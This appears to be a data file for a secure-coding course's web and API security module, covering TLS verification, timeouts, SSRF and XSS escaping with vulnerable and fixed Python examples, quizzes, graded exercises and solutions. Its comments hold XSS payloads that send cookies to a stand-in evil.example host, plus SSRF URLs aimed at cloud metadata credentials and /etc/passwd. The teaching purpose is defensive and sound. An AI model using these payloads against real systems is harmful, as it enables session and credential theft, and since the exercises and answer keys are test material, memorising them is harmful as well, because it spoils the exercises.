export default {
  id: "m10",
  number: 10,
  title: "Web and API security",
  focus: "the edge",
  subtitle:
    "Where your Python meets the network: outbound calls that verify TLS and give up, inbound requests that are validated before anything else, and authorisation checked per object rather than per endpoint.",
  objectives: [
    "Make outbound HTTP calls that verify certificates, time out, and cannot be redirected into your network.",
    "Validate a URL against an allowlist and reject private address space (SSRF).",
    "Escape output correctly, and know which contexts escaping does not cover.",
    "Check authorisation on the object, not the route — the fix for IDOR.",
    "Harden a small JSON API end to end.",
  ],
  rules: [
    { id: "PY-TLS-VERIFY-OFF", what: "`verify=False` accepts any certificate" },
    { id: "PY-NO-TIMEOUT", what: "a request with no timeout waits forever" },
    { id: "PY-SSRF", what: "a URL built from input lets the attacker choose the destination" },
    { id: "PY-XSS-MARKUP", what: "unescaped user data in HTML executes" },
  ],
  capstone:
    "Day 50 takes a deliberately vulnerable document API — IDOR, XSS, SSRF, mass assignment, enumeration — and closes every hole with tests that prove it.",

  lessons: [
    /* ----------------------------------------------------------------- 46 */
    {
      id: "m10l01",
      day: 46,
      title: "Outbound HTTP: verify, time out, give up",
      minutes: 60,
      secure: "TLS verification and timeouts",
      cwe: ["CWE-295", "CWE-400"],
      tags: ["requests", "tls", "timeout", "retry", "redirect"],
      lede:
        "Two keyword arguments decide whether an outbound call is a dependency or a liability: `verify` and `timeout`. One is dangerous when set, the other when omitted.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          code: `import requests

r = requests.get(url, verify=False)          # accepts any certificate
data = r.json()`,
          cap: "`verify=False` is usually added to silence a certificate error during development, then committed. The connection is still encrypted — to whoever answered.",
        },
        {
          t: "p",
          md: `TLS gives you three properties: confidentiality, integrity, and **authentication of the server**. \`verify=False\` discards the third, and without it the other two are meaningless: you have a private, tamper-proof channel to the attacker.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `import requests

r = requests.get(
    url,
    timeout=(3.05, 10),              # (connect, read)
    allow_redirects=False,           # decide redirects yourself
    headers={"Accept": "application/json"},
)
r.raise_for_status()
data = r.json()`,
          cap: "For an internal CA, point `verify` at the bundle — `verify=\"/etc/ssl/corp-ca.pem\"` — rather than turning it off.",
        },
        {
          t: "box",
          kind: "rule",
          title: "`requests` has no default timeout",
          md: `None. A request with no \`timeout\` waits forever. One slow or hostile server holds a worker thread indefinitely, and a pool of thirty workers is thirty requests away from a total outage.

Always pass a tuple: a short connect timeout and a read timeout matched to the endpoint. The auditor flags a missing timeout as **low** — low because it is availability rather than compromise, and still worth fixing everywhere.`,
        },
        {
          t: "table",
          head: ["Argument", "Default", "Set it to"],
          rows: [
            ["`timeout`", "**none — waits forever**", "`(3.05, 10)`"],
            ["`verify`", "`True`", "Leave it. Or a CA bundle path."],
            ["`allow_redirects`", "`True` (except HEAD)", "`False` when the URL is influenced by input."],
            ["`stream`", "`False`", "`True` for large bodies, with a size cap."],
            ["Response size", "unbounded", "Check `Content-Length`, cap while streaming."],
          ],
        },
        { t: "h", text: "Redirects move the destination" },
        {
          t: "p",
          md: `You validated \`https://api.partner.example/data\`. It returns \`302 Location: http://169.254.169.254/latest/meta-data/\`, and \`requests\` follows it by default — carrying your headers, including \`Authorization\`, to a host you never approved.

With \`allow_redirects=False\` you see the \`Location\` and decide. That is the only way validation survives the hop.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `MAX_BYTES = 5 * 1024 * 1024

def fetch_json(url, *, session):
    r = session.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True)
    r.raise_for_status()

    declared = int(r.headers.get("Content-Length") or 0)
    if declared > MAX_BYTES:
        raise ValueError("response too large")

    body = b""
    for chunk in r.iter_content(64 * 1024):      # the declared length may lie
        body += chunk
        if len(body) > MAX_BYTES:
            raise ValueError("response exceeded the size limit")
    return json.loads(body)`,
          cap: "`Content-Length` is a claim by the server. Enforce the cap while reading, not only from the header.",
        },
        {
          t: "box",
          kind: "cve",
          title: "Why `verify=False` survives review",
          md: `It is almost always introduced to fix a real, immediate problem — an expired internal certificate, a self-signed staging host, a proxy with its own CA — and it works instantly. The correct fix (install the CA bundle) takes an hour and a ticket.

That asymmetry is why this specific flag appears in production code far more often than its severity suggests. Treat it as a blocking review comment, every time.`,
        },
      ],
      spot: {
        label: "partner integration",
        prompt: "Click the line that lets an attacker on the network read and rewrite this response.",
        lines: [8],
        why:
          "Line 8. `verify=False` disables certificate validation, so any host that can intercept the connection — a hostile Wi-Fi, a compromised router, a DNS answer — can present its own certificate and both read and modify the traffic. Line 7's timeout is correct and should stay.",
        code: `import requests

def fetch_balance(account_id, token):
    url = f"https://partner.example/accounts/{account_id}"
    r = requests.get(
        url,
        headers={"Authorization": f"Bearer {token}"},
        timeout=(3.05, 10),
        verify=False,
    )
    return r.json()["balance"]`,
      },
      quiz: [
        {
          q: "What does `verify=False` actually give up?",
          options: [
            "Encryption.",
            "Authentication of the server — you are encrypted to whoever answered.",
            "Nothing, it only silences warnings.",
          ],
          answer: 1,
          why: "Without authentication, confidentiality and integrity protect the wrong conversation. The attacker is the endpoint.",
        },
        {
          q: "`requests.get(url)` with no `timeout`:",
          options: [
            "Times out after 30 seconds.",
            "Waits indefinitely, holding the worker.",
            "Raises immediately.",
          ],
          answer: 1,
          why: "`requests` has no default timeout. A slow server is a denial of service against your own service.",
        },
        {
          q: "Why `allow_redirects=False` when the URL involves user input?",
          options: [
            "Redirects are slow.",
            "A redirect moves the request to a host you never validated, carrying your headers with it.",
            "It prevents caching.",
          ],
          answer: 1,
          why: "Validation applies to the URL you checked, not to wherever the server points you next.",
        },
      ],
      exercise: {
        title: "A hardened HTTP client",
        brief: `The simulated \`requests\` module in this course implements real semantics: \`mitm.example.com\` presents a bad certificate, \`slowloris.example.com\` never answers, \`status.example.com\` and \`api.example.com\` behave normally.

Write \`fetch(url, *, timeout=(3.05, 10), max_redirects=0)\` returning the parsed JSON body:

- Always pass an explicit \`timeout\`; never pass \`verify=False\`.
- Pass \`allow_redirects=False\`.
- Raise \`ValueError("certificate verification failed")\` when the server's certificate is rejected (catch \`requests.SSLError\`).
- Raise \`ValueError("request timed out")\` on \`requests.Timeout\`.
- Raise \`ValueError("upstream unavailable")\` on \`requests.ConnectionError\`.
- Raise \`ValueError("upstream returned <status>")\` for a status of 400 or more.
- Let nothing else be swallowed.

Then \`fetch_all(urls, *, limit=5)\` — fetch up to \`limit\` URLs, returning \`{"ok": {url: data}, "failed": {url: reason}}\`. A failure of one URL must not stop the others.`,
        rubric: [
          "A normal endpoint returns parsed JSON",
          "A bad certificate becomes `ValueError`, and `WORLD` records no TLS breach",
          "The slow host becomes a timeout rather than a hang",
          "A 404 becomes a `ValueError` naming the status",
          "`fetch_all` is bounded and isolates failures",
          "No `verify=False`; no missing timeout",
        ],
        starter: `import requests


def fetch(url, *, timeout=(3.05, 10), max_redirects=0):
    """Fetch JSON with TLS verification, a timeout, and no silent redirects."""


def fetch_all(urls, *, limit=5):
    """Fetch several URLs, isolating failures."""


print(fetch("https://status.example.com/"))
print(fetch_all(["https://status.example.com/", "https://mitm.example.com/x"]))
`,
        stdin: [],
        tests: [
          {
            name: "a normal endpoint returns parsed JSON",
            code: `got = fetch("https://status.example.com/")
assert got["status"] == "ok", f"got {got!r}"
users = fetch("https://api.example.com/v1/users")
assert isinstance(users, list) and users[0]["name"] == "ada", f"got {users!r}"`,
          },
          {
            name: "a bad certificate is refused, not accepted",
            code: `WORLD.reset()
try:
    fetch("https://mitm.example.com/account")
    raise AssertionError("a forged certificate was accepted")
except ValueError as e:
    assert "certificate" in str(e), f"got {str(e)!r}"
assert "tls-mitm" not in WORLD.kinds(), f"TLS was downgraded: {WORLD.report()}"`,
          },
          {
            name: "the slow host times out instead of hanging",
            code: `WORLD.reset()
try:
    fetch("https://slowloris.example.com/")
    raise AssertionError("expected a timeout")
except ValueError as e:
    assert "timed out" in str(e), f"got {str(e)!r}"
assert "resource-exhaustion" not in WORLD.kinds(), f"the call hung: {WORLD.report()}"`,
          },
          {
            name: "error statuses are surfaced",
            code: `try:
    fetch("https://api.example.com/v1/nothing-here")
    raise AssertionError("expected a ValueError")
except ValueError as e:
    assert "404" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "unresolvable hosts are reported",
            code: `try:
    fetch("https://no-such-host.example/")
    raise AssertionError("expected a ValueError")
except ValueError as e:
    assert "unavailable" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "fetch_all isolates failures and respects the limit",
            code: `urls = ["https://status.example.com/", "https://mitm.example.com/x",
        "https://api.example.com/v1/health", "https://no-such-host.example/"]
got = fetch_all(urls)
assert set(got["ok"]) == {"https://status.example.com/", "https://api.example.com/v1/health"}, f"got {got!r}"
assert set(got["failed"]) == {"https://mitm.example.com/x", "https://no-such-host.example/"}
limited = fetch_all(urls, limit=2)
assert len(limited["ok"]) + len(limited["failed"]) == 2, f"got {limited!r}"`,
          },
          {
            name: "no breach is recorded for the whole run",
            code: `WORLD.reset()
fetch_all(["https://status.example.com/", "https://mitm.example.com/x",
           "https://slowloris.example.com/"])
assert not WORLD.breached, f"a breach occurred: {WORLD.report()}"`,
          },
        ],
        requirements: [
          { kind: "defines", value: "fetch" },
          { kind: "uses_module", value: "requests" },
          { kind: "no_finding", value: "PY-TLS-VERIFY-OFF" },
          { kind: "no_finding", value: "PY-NO-TIMEOUT" },
          { kind: "forbids", value: "verify\\s*=\\s*False", message: "Never disable certificate verification." },
        ],
        hints: [
          "Order the `except` clauses from specific to general: `requests.SSLError` and `requests.Timeout` are both subclasses of `requests.RequestException`, so they must come first.",
          "`requests.ConnectionError` covers an unresolvable host in this simulation; catch it separately so the reason is accurate.",
          "Check `r.status_code >= 400` yourself rather than using `raise_for_status()`, so the message you raise contains the number the test looks for.",
          "In `fetch_all`, slice the URL list first (`urls[:limit]`) and wrap each `fetch` in its own `try/except ValueError` — one failure must not end the loop.",
        ],
        solution: `import requests

DEFAULT_TIMEOUT = (3.05, 10)


def fetch(url, *, timeout=DEFAULT_TIMEOUT, max_redirects=0):
    """Fetch JSON with TLS verification, a timeout, and no silent redirects."""
    try:
        response = requests.get(
            url,
            timeout=timeout,
            allow_redirects=bool(max_redirects),
        )
    except requests.SSLError as exc:
        raise ValueError("certificate verification failed") from exc
    except requests.Timeout as exc:
        raise ValueError("request timed out") from exc
    except requests.ConnectionError as exc:
        raise ValueError("upstream unavailable") from exc
    except requests.RequestException as exc:
        raise ValueError("upstream request failed") from exc

    if response.status_code >= 400:
        raise ValueError(f"upstream returned {response.status_code}")

    return response.json()


def fetch_all(urls, *, limit=5):
    """Fetch several URLs, isolating failures."""
    ok, failed = {}, {}

    for url in list(urls)[:limit]:
        try:
            ok[url] = fetch(url)
        except ValueError as exc:
            failed[url] = str(exc)

    return {"ok": ok, "failed": failed}


print(fetch("https://status.example.com/"))
print(fetch_all(["https://status.example.com/", "https://mitm.example.com/x"]))`,
        why: `\`verify\` is never mentioned, which is the correct way to use it: the default is \`True\`, and the only reason to write it is to point at a CA bundle. A codebase where \`verify\` never appears is a codebase where it was never turned off.

The timeout is a **parameter with a default**, not a literal buried in the call. That means a caller can lengthen it for one slow endpoint without anyone being tempted to delete it, and a grep for \`timeout=\` finds every call site.

The exception translation turns four library-specific failures into one vocabulary the caller can handle, while \`from exc\` keeps the original for the logs. The clause order matters: \`SSLError\` and \`Timeout\` both inherit from \`RequestException\`, so a broad clause placed first would swallow them and report "upstream request failed" for a certificate attack — losing exactly the signal you most want on a dashboard.

\`fetch_all\` catches only \`ValueError\` — the type \`fetch\` promises. A \`TypeError\` from passing a non-string URL propagates, because that is a bug in the caller rather than an upstream failure, and silently recording it as "failed" would hide it behind plausible-looking output.

The size cap discussed in the lesson is absent here only because the simulated responses are small. In production it belongs in \`fetch\`, enforced while streaming rather than from \`Content-Length\`, which is a claim the server makes about itself.`,
      },
      wrapup: `- \`verify=False\` discards server authentication; fix the certificate instead.
- \`requests\` has no default timeout. Always pass one.
- \`allow_redirects=False\` keeps validation meaningful; a redirect is a new destination.
- Translate library exceptions into your own vocabulary, specific clauses first.`,
      refs: [
        { label: "requests — timeouts", url: "https://requests.readthedocs.io/en/latest/user/advanced/#timeouts" },
        { label: "CWE-295: Improper Certificate Validation", url: "https://cwe.mitre.org/data/definitions/295.html" },
      ],
    },

    /* ----------------------------------------------------------------- 47 */
    {
      id: "m10l02",
      day: 47,
      title: "SSRF: when the attacker chooses your destination",
      minutes: 60,
      secure: "URL and host allowlisting",
      cwe: ["CWE-918"],
      tags: ["ssrf", "url", "metadata", "allowlist", "private-ip"],
      lede:
        "Your server can reach things the internet cannot: the metadata service, the admin port, the database. A feature that fetches a user-supplied URL hands that reach to whoever asks.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          code: `import requests

def fetch_avatar(url):
    """Let users import an avatar from a URL."""
    return requests.get(url, timeout=5).content

# attacker submits:
#   http://169.254.169.254/latest/meta-data/iam/security-credentials/app
#   http://localhost:9200/_cluster/health
#   http://10.0.0.5:6379/
#   file:///etc/passwd`,
          cap: "The cloud metadata endpoint at 169.254.169.254 returns temporary credentials for the instance's role. It is reachable only from inside the instance — which is exactly where your code runs.",
        },
        {
          t: "box",
          kind: "try",
          title: "Watch it work",
          md: `Run this in the console:

\`\`\`
import requests
r = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/app", timeout=3)
print(r.json())
WORLD.kinds()
\`\`\`

The simulated world records an \`ssrf\` event and hands back credentials. In a real cloud account those are the keys to the instance's role.`,
        },
        {
          t: "box",
          kind: "cve",
          title: "Capital One, 2019",
          md: `An SSRF in a web application firewall was used to reach the EC2 metadata service, retrieve the instance role's credentials, and list and copy S3 buckets — about 100 million credit applications. The fine was 80 million dollars.

The technical primitive was a server fetching a URL an attacker controlled.`,
        },
        { t: "h", text: "Why blocking `169.254.169.254` is not enough" },
        {
          t: "table",
          head: ["Bypass", "Example"],
          rows: [
            ["Decimal / octal / hex IP", "`http://2852039166/` is 169.254.169.254"],
            ["IPv6 and mapped forms", "`http://[::ffff:169.254.169.254]/`"],
            ["DNS pointing at a private IP", "`http://metadata.attacker.example/`"],
            ["Redirect to a private host", "`https://ok.example/r` → 302 → `http://10.0.0.1/`"],
            ["DNS rebinding", "Resolves public at check time, private at connect time"],
            ["Other schemes", "`file://`, `gopher://`, `dict://`"],
          ],
        },
        {
          t: "box",
          kind: "rule",
          title: "The layered defence",
          md: `1. **Allowlist the host** when you can — a fixed set of partner domains beats any filter.
2. **Allowlist the scheme**: \`https\` only.
3. **Resolve the name yourself**, and reject private, loopback, link-local and reserved address space.
4. **Disable redirects**, or re-validate each hop.
5. **Pin the connection to the resolved IP**, which is the only complete answer to DNS rebinding.
6. **Egress-filter at the network layer** — the control that still works when the code is wrong.

Steps 1–4 are a day's work. Step 6 is what actually saves you.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `import ipaddress
from urllib.parse import urlparse

ALLOWED_HOSTS = frozenset({"images.partner.example", "cdn.partner.example"})

def validate_url(raw):
    """Return the URL only if it is one we are willing to fetch."""
    parts = urlparse(raw)
    if parts.scheme != "https":
        raise ValueError("only https is permitted")
    if parts.port not in (None, 443):
        raise ValueError("only port 443 is permitted")
    if parts.hostname not in ALLOWED_HOSTS:
        raise ValueError("host is not on the allowlist")
    return raw

def is_private(host):
    """True for any address we must never connect to."""
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False                    # a name: resolve it before deciding
    return (ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_reserved or ip.is_multicast or ip.is_unspecified)`,
          cap: "`ipaddress` understands decimal, hex and IPv6 forms, so it defeats the numeric bypasses that a string comparison misses.",
        },
        {
          t: "box",
          kind: "warn",
          title: "`urlparse` is not a validator",
          md: `\`urlparse("http://evil.example#@good.example/")\` and similar constructions parse differently in different libraries — the browser, your proxy and \`urlparse\` may disagree about the host. Credentials in the authority (\`http://user@host/\`), backslashes and whitespace all have surprising handling.

Parse, then check **each component explicitly**: scheme, hostname, port. Never pattern-match the whole URL string.`,
        },
      ],
      spot: {
        label: "webhook registration",
        prompt: "Click the line where the attacker's URL becomes your server's outbound request.",
        lines: [7],
        why:
          "Line 7. `url` goes straight to `requests.post`, so a customer registering `http://169.254.169.254/latest/meta-data/` makes your server fetch its own cloud credentials and deliver the result wherever they can read it. The `https://` prefix check on line 5 is bypassed by a redirect and says nothing about the destination address.",
        code: `import requests

def register_webhook(db, customer_id, url):
    if not url.startswith("https://"):
        raise ValueError("https required")
    db.save_webhook(customer_id, url)
    requests.post(url, json={"event": "webhook.verified"}, timeout=5)
    return {"ok": True}`,
      },
      quiz: [
        {
          q: "Why is blocking the literal string `169.254.169.254` insufficient?",
          options: [
            "It is enough.",
            "The same address has decimal, hex and IPv6 spellings, and a DNS name can point at it.",
            "The metadata service uses a different IP.",
          ],
          answer: 1,
          why: "Parse the host into an `ipaddress` object and test its properties, and resolve names before deciding.",
        },
        {
          q: "You validate the host, then follow a redirect. What happened to your validation?",
          options: [
            "It still applies.",
            "It applied to the first URL only; the redirect is an unvalidated destination.",
            "Redirects cannot change the host.",
          ],
          answer: 1,
          why: "Disable redirects, or re-run the full validation on each hop.",
        },
        {
          q: "Which control still works when the application code is wrong?",
          options: [
            "A URL allowlist.",
            "Network egress filtering and a metadata service that requires a session token (IMDSv2).",
            "Input sanitisation.",
          ],
          answer: 1,
          why: "Defence in depth: assume the validation will eventually be bypassed and make the destination unreachable anyway.",
        },
      ],
      exercise: {
        title: "A URL validator that survives the bypass list",
        brief: `Write \`validate_url(raw, *, allowed_hosts=ALLOWED_HOSTS)\` returning the URL when it is safe to fetch, else raising \`ValueError\` with a specific message.

Checks, in this order:

1. \`raw\` must be a \`str\` of at most 2000 characters → \`"malformed url"\`
2. It must parse, and the scheme must be exactly \`"https"\` → \`"scheme not permitted"\`
3. No userinfo (\`@\` in the authority) → \`"credentials in url"\`
4. A hostname must be present → \`"malformed url"\`
5. Port must be \`None\` or 443 → \`"port not permitted"\`
6. If the hostname parses as an IP address, it must not be private, loopback, link-local, reserved, multicast or unspecified → \`"address not permitted"\`
7. The hostname (lower-cased) must be in \`allowed_hosts\` → \`"host not permitted"\`

Then \`is_safe_ip(host)\` returning \`True\` when \`host\` is an IP literal that is *not* in any of those ranges, and \`False\` for private addresses **and** for anything that is not an IP literal (a name must be resolved before it can be judged).

Finally \`safe_fetch(raw, *, allowed_hosts=ALLOWED_HOSTS)\` — validate, then \`requests.get\` with a timeout and \`allow_redirects=False\`, returning \`response.json()\`.`,
        rubric: [
          "`https` scheme, allowlisted host and default port pass",
          "Decimal, hex and IPv6 spellings of a private address are rejected",
          "Userinfo, odd ports and non-https schemes are rejected with their own messages",
          "`is_safe_ip` returns `False` for names as well as for private addresses",
          "`safe_fetch` never reaches a non-allowlisted host; `WORLD` records no SSRF",
        ],
        starter: `import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_HOSTS = frozenset({"api.example.com", "status.example.com"})
MAX_URL = 2000


def is_safe_ip(host):
    """True only for a public IP literal."""


def validate_url(raw, *, allowed_hosts=ALLOWED_HOSTS):
    """Return raw when it is safe to fetch, else raise ValueError."""


def safe_fetch(raw, *, allowed_hosts=ALLOWED_HOSTS):
    """Validate, then fetch with a timeout and no redirects."""


print(validate_url("https://api.example.com/v1/health"))
print(safe_fetch("https://status.example.com/"))
`,
        stdin: [],
        tests: [
          {
            name: "an allowlisted https url passes",
            code: `for ok in ("https://api.example.com/v1/users",
           "https://API.example.com/v1/users",
           "https://status.example.com:443/"):
    assert validate_url(ok) == ok, f"{ok!r} should be accepted"`,
          },
          {
            name: "scheme and port are enforced",
            code: `cases = {
    "http://api.example.com/": "scheme not permitted",
    "ftp://api.example.com/": "scheme not permitted",
    "file:///etc/passwd": "scheme not permitted",
    "gopher://api.example.com/": "scheme not permitted",
    "https://api.example.com:8080/": "port not permitted",
}
for url, expected in cases.items():
    try:
        validate_url(url)
        raise AssertionError(f"{url!r} should have been rejected")
    except ValueError as e:
        assert expected in str(e), f"{url!r}: got {str(e)!r}, expected {expected!r}"`,
          },
          {
            name: "credentials in the authority are rejected",
            code: `for url in ("https://user@api.example.com/", "https://user:pw@api.example.com/",
            "https://api.example.com@evil.example/"):
    try:
        validate_url(url)
        raise AssertionError(f"{url!r} should have been rejected")
    except ValueError as e:
        assert "credentials" in str(e) or "host not permitted" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "private addresses are rejected in every spelling",
            code: `for url in ("https://169.254.169.254/latest/meta-data/",
            "https://127.0.0.1/", "https://10.0.0.5/", "https://192.168.1.1/",
            "https://172.16.0.1/", "https://[::1]/", "https://0.0.0.0/"):
    try:
        validate_url(url)
        raise AssertionError(f"{url!r} should have been rejected")
    except ValueError as e:
        assert "not permitted" in str(e), f"{url!r}: got {str(e)!r}"`,
          },
          {
            name: "is_safe_ip judges literals only",
            code: `assert is_safe_ip("8.8.8.8") is True
assert is_safe_ip("2001:4860:4860::8888") is True
for bad in ("169.254.169.254", "127.0.0.1", "10.0.0.1", "192.168.0.1", "::1", "0.0.0.0", "224.0.0.1"):
    assert is_safe_ip(bad) is False, f"{bad!r} should be unsafe"
for name in ("api.example.com", "localhost", "", "not an ip"):
    assert is_safe_ip(name) is False, f"{name!r} is not an IP literal and must not be called safe"`,
          },
          {
            name: "a public IP is still refused when it is not allowlisted",
            code: `try:
    validate_url("https://8.8.8.8/")
    raise AssertionError("a non-allowlisted host should be rejected")
except ValueError as e:
    assert "host not permitted" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "malformed input is handled",
            code: `for bad in ("", "not a url", None, 42, "https://", "h" * 2100):
    with raises(ValueError):
        validate_url(bad)`,
          },
          {
            name: "safe_fetch never reaches the metadata service",
            code: `WORLD.reset()
for url in ("https://169.254.169.254/latest/meta-data/iam/security-credentials/app",
            "http://169.254.169.254/latest/meta-data/"):
    with raises(ValueError):
        safe_fetch(url)
assert "ssrf" not in WORLD.kinds(), f"an SSRF was performed: {WORLD.report()}"
got = safe_fetch("https://status.example.com/")
assert got["status"] == "ok", f"got {got!r}"`,
          },
        ],
        requirements: [
          { kind: "defines", value: "validate_url" },
          { kind: "defines", value: "is_safe_ip" },
          { kind: "uses_module", value: "ipaddress" },
          { kind: "no_finding", value: "PY-SSRF" },
        ],
        hints: [
          "`urlparse(raw)` can raise for genuinely malformed input — wrap it and translate to `ValueError(\"malformed url\")`.",
          "`parts.hostname` is already lower-cased and strips userinfo and brackets from IPv6 — but check `\"@\" in parts.netloc` separately to catch credentials before they confuse anything.",
          "`ipaddress.ip_address(host)` raises `ValueError` for a name. Use that: in `is_safe_ip`, a name means `False`; in `validate_url`, it means 'not an IP, fall through to the host allowlist'.",
          "Check the IP properties with a single `any(...)` over `is_private, is_loopback, is_link_local, is_reserved, is_multicast, is_unspecified`.",
        ],
        solution: `import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_HOSTS = frozenset({"api.example.com", "status.example.com"})
MAX_URL = 2000
BAD_RANGES = ("is_private", "is_loopback", "is_link_local",
              "is_reserved", "is_multicast", "is_unspecified")


def is_safe_ip(host):
    """True only for a public IP literal."""
    try:
        ip = ipaddress.ip_address(str(host))
    except ValueError:
        return False            # a name is not judgeable until it is resolved
    return not any(getattr(ip, prop) for prop in BAD_RANGES)


def validate_url(raw, *, allowed_hosts=ALLOWED_HOSTS):
    """Return raw when it is safe to fetch, else raise ValueError."""
    if not isinstance(raw, str) or not raw or len(raw) > MAX_URL:
        raise ValueError("malformed url")

    try:
        parts = urlparse(raw)
    except ValueError as exc:
        raise ValueError("malformed url") from exc

    if parts.scheme != "https":
        raise ValueError("scheme not permitted")

    if "@" in parts.netloc:
        raise ValueError("credentials in url")

    host = parts.hostname
    if not host:
        raise ValueError("malformed url")

    try:
        port = parts.port
    except ValueError as exc:
        raise ValueError("port not permitted") from exc
    if port not in (None, 443):
        raise ValueError("port not permitted")

    # An IP literal is judged on its address range...
    try:
        ipaddress.ip_address(host)
    except ValueError:
        pass                                  # not a literal: fall through
    else:
        if not is_safe_ip(host):
            raise ValueError("address not permitted")

    # ...and every host, literal or name, must still be on the allowlist.
    if host.lower() not in allowed_hosts:
        raise ValueError("host not permitted")

    return raw


def safe_fetch(raw, *, allowed_hosts=ALLOWED_HOSTS):
    """Validate, then fetch with a timeout and no redirects."""
    url = validate_url(raw, allowed_hosts=allowed_hosts)
    response = requests.get(url, timeout=(3.05, 10), allow_redirects=False)
    if response.status_code >= 400:
        raise ValueError(f"upstream returned {response.status_code}")
    return response.json()


print(validate_url("https://api.example.com/v1/health"))
print(safe_fetch("https://status.example.com/"))`,
        why: `The host allowlist is the control that actually decides, and everything else narrows the ways around it. That ordering is deliberate: a public IP like \`8.8.8.8\` passes the address-range test and is *still* rejected, because being non-private is not the same as being approved.

Parsing with \`urlparse\` and then inspecting \`parts.scheme\`, \`parts.netloc\`, \`parts.hostname\` and \`parts.port\` separately is what defeats the authority-confusion tricks. A string check like \`raw.startswith("https://")\` accepts \`https://api.example.com@evil.example/\`, where the real host is \`evil.example\` — \`parts.hostname\` returns \`evil.example\` and the allowlist refuses it, and the explicit \`@\` check rejects it even earlier with a clearer message.

\`ipaddress\` does the numeric work. \`2852039166\`, \`0xA9FEA9FE\` and \`[::ffff:169.254.169.254]\` are all the metadata address, and all of them become the same \`IPv4Address\`/\`IPv6Address\` object with \`is_link_local\` true. A denylist of strings catches none of them; a parser catches all of them.

\`is_safe_ip\` returning \`False\` for names is the subtle part, and the tests pin it. "Not an IP literal" is not evidence of safety — \`metadata.attacker.example\` can resolve to 169.254.169.254. The function refuses to guess, which forces the caller to rely on the allowlist for names rather than on a check that cannot see what the name means.

What remains uncovered, and should be stated in any real design document: DNS rebinding. The name is resolved again when the connection is made, so a record with a one-second TTL can be public at validation time and private at connect time. Closing that needs resolution and connection pinned to the same address — or, more practically, the egress filtering that makes the destination unreachable no matter what the code decides.`,
      },
      wrapup: `- Allowlist the host; everything else only narrows the bypasses.
- Parse the URL and check components; never pattern-match the string.
- \`ipaddress\` collapses every numeric spelling of a private address into one object.
- A hostname is not safe just because it is not an IP — and egress filtering is the control that survives a code bug.`,
      refs: [
        { label: "OWASP SSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" },
        { label: "ipaddress", url: "https://docs.python.org/3/library/ipaddress.html" },
        { label: "CWE-918: Server-Side Request Forgery", url: "https://cwe.mitre.org/data/definitions/918.html" },
      ],
    },

    /* ----------------------------------------------------------------- 48 */
    {
      id: "m10l03",
      day: 48,
      title: "Output encoding, and the escaping that does not apply",
      minutes: 60,
      secure: "context-correct escaping",
      cwe: ["CWE-79", "CWE-116"],
      tags: ["xss", "escaping", "templates", "html", "context"],
      lede:
        "Escaping is not a property of data; it is a property of *where the data is going*. HTML-escaping a value that lands inside a `<script>` block protects nothing.",
      blocks: [
        {
          t: "code",
          label: "vulnerable",
          code: `from miniweb import render

def comment_page(comment):
    return render("<div class='comment'>{body}</div>",
                  autoescape=False, body=comment)

# comment = "<script>fetch('https://evil.example?c='+document.cookie)</script>"`,
          cap: "Stored XSS: the payload is saved once and executes in the browser of every reader, with their session.",
        },
        {
          t: "code",
          label: "fixed",
          code: `from miniweb import render

def comment_page(comment):
    return render("<div class='comment'>{body}</div>", body=comment)   # escaped`,
          cap: "`<` becomes `&lt;`, so the browser renders the text of a script tag instead of executing it.",
        },
        {
          t: "table",
          head: ["Where the value lands", "Correct encoding"],
          rows: [
            ["HTML text — `<p>HERE</p>`", "HTML-escape `& < > \" '`"],
            ["Attribute — `<a title=\"HERE\">`", "HTML-escape **and** always quote the attribute"],
            ["URL parameter — `?q=HERE`", "`urllib.parse.quote`"],
            ["Inside `<script>` — `var x = HERE;`", "`json.dumps`, or do not put it there"],
            ["CSS — `style=\"color: HERE\"`", "Do not. There is no safe general escaping."],
            ["`href=\"HERE\"`", "Allowlist the scheme: `javascript:` is an XSS vector"],
          ],
        },
        {
          t: "box",
          kind: "rule",
          title: "Escape at output, in the right context",
          md: `Store the raw value; encode when rendering, for the specific destination. Encoding on the way *in* produces double-encoded text, breaks search and comparison, and still gets it wrong for the contexts you did not anticipate.

A template engine with autoescaping on handles the HTML-text case for you. It does **not** handle the URL, script or CSS cases — those remain yours.`,
        },
        {
          t: "box",
          kind: "pitfall",
          title: "`Markup` and `|safe` turn escaping off",
          md: `\`markupsafe.Markup(value)\` and Jinja's \`{{ value|safe }}\` both declare *this is trusted HTML*. If any part of that string came from a user, you have written the vulnerability deliberately.

The legitimate use is wrapping HTML your own code constructed from escaped parts. The auditor rates \`Markup()\` on a variable as **high**.`,
        },
        { t: "h", text: "The attribute and URL cases" },
        {
          t: "code",
          label: "vulnerable",
          code: `html = f"<a href='{url}'>profile</a>"
# url = "javascript:fetch('https://evil.example?c='+document.cookie)"

html = f"<div class={css_class}>"            # unquoted attribute
# css_class = "x onmouseover=alert(1)"`,
          cap: "Escaping does not help here. An unquoted attribute needs no quote character to break out of, and `javascript:` is a perfectly well-formed URL.",
        },
        {
          t: "code",
          label: "fixed",
          code: `from urllib.parse import urlparse
from miniweb import escape

SAFE_SCHEMES = ("http", "https", "mailto")

def safe_href(url):
    scheme = urlparse(url).scheme.lower()
    if scheme not in SAFE_SCHEMES:
        return "#"
    return escape(url)

html = f'<a href="{safe_href(url)}">profile</a>'    # quoted AND validated`,
        },
        {
          t: "box",
          kind: "good",
          title: "Defence in depth for the browser",
          md: `- **Content-Security-Policy** — \`script-src 'self'\` stops inline script from executing even when a payload lands.
- **HttpOnly cookies** — JavaScript cannot read the session cookie, which removes the most common XSS goal.
- **SameSite=Lax/Strict** — mitigates CSRF.
- **X-Content-Type-Options: nosniff** — stops a browser from deciding your JSON is HTML.

